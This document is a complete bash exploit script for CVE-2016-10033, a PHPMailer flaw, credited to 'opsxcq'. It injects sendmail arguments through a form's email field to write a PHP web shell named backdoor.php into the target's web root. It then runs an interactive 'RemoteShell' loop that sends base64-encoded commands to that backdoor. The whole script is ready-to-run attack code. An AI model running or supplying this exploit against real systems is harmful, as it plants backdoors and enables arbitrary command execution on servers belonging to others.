# CVE-2016-10033 exploit by opsxcq
# https://github.com/opsxcq/exploit-CVE-2016-10033
 
echo &#039;[+] CVE-2016-10033 exploit by opsxcq&#039;
 
if [ -z "$1" ]
then
    echo &#039;[-] Please inform an host as parameter&#039;
    exit -1
fi
 
host=$1
 
echo &#039;[+] Exploiting &#039;$host
 
curl -sq &#039;http://&#039;$host -H &#039;Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzXJpHSq4mNy35tHe&#039; --data-binary $&#039;------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="action"\r\n\r\nsubmit\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="name"\r\n\r\n<?php echo "|".base64_encode(system(base64_decode($_GET["cmd"])))."|"; ?>\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="email"\r\n\r\nvulnerables@ -OQueueDirectory=/tmp -X/www/backdoor.php\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="message"\r\n\r\nPwned\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe--\r\n&#039; >/dev/null && echo &#039;[+] Target exploited, acessing shell at http://&#039;$host&#039;/backdoor.php&#039;
 
cmd=&#039;whoami&#039;
while [ "$cmd" != &#039;exit&#039; ]
do
    echo &#039;[+] Running &#039;$cmd
    curl -sq http://$host/backdoor.php?cmd=$(echo -ne $cmd | base64) | grep &#039;|&#039; | head -n 1 | cut -d &#039;|&#039; -f 2 | base64 -d
    echo
    read -p &#039;RemoteShell> &#039; cmd
done
echo &#039;[+] Exiting&#039;

